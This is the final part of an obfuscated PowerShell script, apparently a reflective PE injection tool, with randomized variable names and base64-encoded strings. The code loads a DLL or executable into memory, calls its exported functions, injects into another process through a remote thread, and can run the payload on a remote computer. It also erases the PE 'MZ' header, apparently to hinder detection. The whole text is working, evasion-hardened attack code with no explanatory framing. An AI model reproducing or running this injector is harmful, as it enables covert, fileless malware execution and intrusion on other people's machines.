		${a6f1c45867c645738edd3413cf0d7718} = Get-PEDetailedInfo -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
		if ((${a6f1c45867c645738edd3413cf0d7718}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${dbc8e071ba554a5991d5c23be7628337} -eq [IntPtr]::Zero))
		{
	        switch (${c6fed254ae924af494abfe759439ef04})
	        {
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -bcef229339c34b6aa25db34ee4c417ae $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${64efd173584c47c8a138561958b7ae71} = Get-DelegateType @() ([IntPtr])
				    ${a5c0bc5766da43639498b0c48b0a18ff} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, ${64efd173584c47c8a138561958b7ae71})
				    [IntPtr]$OutputPtr = ${a5c0bc5766da43639498b0c48b0a18ff}.Invoke()
				    ${80802835625046369e355ace3996464a} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    echo ${80802835625046369e355ace3996464a}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -bcef229339c34b6aa25db34ee4c417ae $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${76286fecd8e8478aa33b9ca25d652714} = Get-DelegateType @() ([IntPtr])
				    ${49db2ba37ab744a2a9983b2d06fb3916} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, ${76286fecd8e8478aa33b9ca25d652714})
				    [IntPtr]$OutputPtr = ${49db2ba37ab744a2a9983b2d06fb3916}.Invoke()
				    ${80802835625046369e355ace3996464a} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    echo ${80802835625046369e355ace3996464a}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${4dd532ed6cc24ae68397a8adbef8306d} = Get-MemoryProcAddress -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -bcef229339c34b6aa25db34ee4c417ae $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
				    if (${4dd532ed6cc24ae68397a8adbef8306d} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${9e6a3f84b16946ceace5b8a88b57c99a} = Get-DelegateType @() ([Void])
				    ${13b168aaf2834c8ba67d3c38d4744cb2} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${4dd532ed6cc24ae68397a8adbef8306d}, ${9e6a3f84b16946ceace5b8a88b57c99a})
				    ${13b168aaf2834c8ba67d3c38d4744cb2}.Invoke() | Out-Null
	            }
	        }
		}
		elseif ((${a6f1c45867c645738edd3413cf0d7718}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${dbc8e071ba554a5991d5c23be7628337} -ne [IntPtr]::Zero))
		{
			${4dd532ed6cc24ae68397a8adbef8306d} = Get-MemoryProcAddress -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -bcef229339c34b6aa25db34ee4c417ae $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${4dd532ed6cc24ae68397a8adbef8306d} -eq $null) -or (${4dd532ed6cc24ae68397a8adbef8306d} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${4dd532ed6cc24ae68397a8adbef8306d} = Sub-SignedIntAsUnsigned ${4dd532ed6cc24ae68397a8adbef8306d} ${dd4b2676e8224a01aaf12b89b05f1b62}
			${4dd532ed6cc24ae68397a8adbef8306d} = Add-SignedIntAsUnsigned ${4dd532ed6cc24ae68397a8adbef8306d} ${e3694672f13548bb9fc9b8bc03340ff7}
			${03df08d8080045db90eb42fba5fdfdab} = Create-RemoteThread -ae1e830f808141fc83d07d13d133dd73 ${dbc8e071ba554a5991d5c23be7628337} -cf3b0c7ec8154434be540fb42c7d8bc2 ${4dd532ed6cc24ae68397a8adbef8306d} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5}
		}
		if (${dbc8e071ba554a5991d5c23be7628337} -eq [IntPtr]::Zero -and ${a6f1c45867c645738edd3413cf0d7718}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			Invoke-MemoryFreeLibrary -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62}
		}
		else
		{
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualFree.Invoke(${dd4b2676e8224a01aaf12b89b05f1b62}, [UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose "PowerShell ProcessID: $PID"
	${9579641ed4504544954ccdf5b0d179df} = (${dd84f627e34042a19d0e69bbfb56125d}[0..1] | % {[Char] $_}) -join ''
    if (${9579641ed4504544954ccdf5b0d179df} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
	if (-not ${ae505d2e9ab74e5393bb21ce1d2bddc4}) {
		${dd84f627e34042a19d0e69bbfb56125d}[0] = 0
		${dd84f627e34042a19d0e69bbfb56125d}[1] = 0
	}
	if (${eae5ed9674894f6898fbef0835eef491} -ne $null -and ${eae5ed9674894f6898fbef0835eef491} -ne '')
	{
		${eae5ed9674894f6898fbef0835eef491} = "ReflectiveExe ${eae5ed9674894f6898fbef0835eef491}"
	}
	else
	{
		${eae5ed9674894f6898fbef0835eef491} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
	}
	if (${ab7f34394b2a416094036841ab265c22} -eq $null -or ${ab7f34394b2a416094036841ab265c22} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${7cfff7ba80834713864e9802dc916c76} -ArgumentList @(${dd84f627e34042a19d0e69bbfb56125d}, ${c6fed254ae924af494abfe759439ef04}, ${d5db2eebed4843d5965cd466ea96af95}, ${ef8ec5899e654fb7ba1f4be16a82ddab},${af14924eb7024c53a36e0e49783042b6})
	}
	else
	{
		icm -ScriptBlock ${7cfff7ba80834713864e9802dc916c76} -ArgumentList @(${dd84f627e34042a19d0e69bbfb56125d}, ${c6fed254ae924af494abfe759439ef04}, ${d5db2eebed4843d5965cd466ea96af95}, ${ef8ec5899e654fb7ba1f4be16a82ddab},${af14924eb7024c53a36e0e49783042b6}) -ComputerName ${ab7f34394b2a416094036841ab265c22}
	}
}
Main
}